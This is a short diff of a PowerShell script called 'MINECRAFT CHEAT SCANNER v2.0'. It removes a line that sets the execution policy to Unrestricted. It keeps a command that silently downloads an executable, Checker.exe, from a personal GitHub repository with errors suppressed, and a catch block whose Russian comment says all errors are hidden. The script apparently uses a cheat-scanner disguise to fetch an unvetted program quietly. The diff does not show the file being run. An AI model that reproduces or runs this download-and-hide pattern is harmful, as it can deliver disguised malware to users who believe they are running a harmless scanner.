@@ -1,5 +1,4 @@
 # MINECRAFT CHEAT SCANNER v2.0 
-Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
 
  Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/Checker.exe" -OutFile "Checker.exe" -ErrorAction SilentlyContinue
     
@@ -101,6 +100,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
